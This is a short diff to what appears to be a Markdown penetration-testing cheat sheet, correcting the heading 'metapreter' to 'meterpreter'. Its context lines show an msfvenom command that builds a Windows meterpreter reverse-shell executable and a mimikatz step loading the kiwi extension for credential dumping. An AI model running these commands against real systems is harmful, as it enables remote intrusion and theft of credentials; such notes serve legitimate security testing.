@@ -302,7 +302,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
 ```
 # windows
 
-## metapreter
+## meterpreter
 ### mimikatz
 ```
 meterpreter > load kiwi
